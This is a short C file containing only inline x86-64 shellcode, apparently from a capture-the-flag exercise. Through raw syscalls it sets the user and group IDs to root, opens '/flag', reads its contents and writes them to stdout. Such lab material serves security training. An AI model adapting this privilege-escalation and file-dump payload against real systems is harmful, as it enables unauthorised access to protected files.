void _start() {
    asm volatile (
        "mov $0x69, %%eax\n"  // setuid syscall number
        "mov $0, %%edi\n"     // uid 0
        "syscall\n"
        "mov $0x6a, %%eax\n"  // setgid syscall number
        "mov $0, %%edi\n"     // gid 0
        "syscall\n"
        "mov $0x2, %%eax\n"   // open syscall number
        "lea flag_str(%%rip), %%rdi\n"  // address of "/flag" string
        "mov $0, %%esi\n"     // O_RDONLY
        "syscall\n"
        "mov %%eax, %%edi\n"  // fd
        "mov $0x0, %%eax\n"   // read syscall number
        "lea -0x100(%%rsp), %%rsi\n"  // buffer
        "mov $0x100, %%edx\n" // size
        "syscall\n"
        "mov $0x1, %%edi\n"   // stdout
        "mov $0x1, %%eax\n"   // write syscall number
        "syscall\n"
        "mov $0x3c, %%eax\n"  // exit syscall number
        "mov $0, %%edi\n"     // exit code
        "syscall\n"
        "flag_str: .asciz \"/flag\"\n"  // "/flag" string
        :
        :
        : "rax", "rdi", "rsi", "rdx"
    );
}
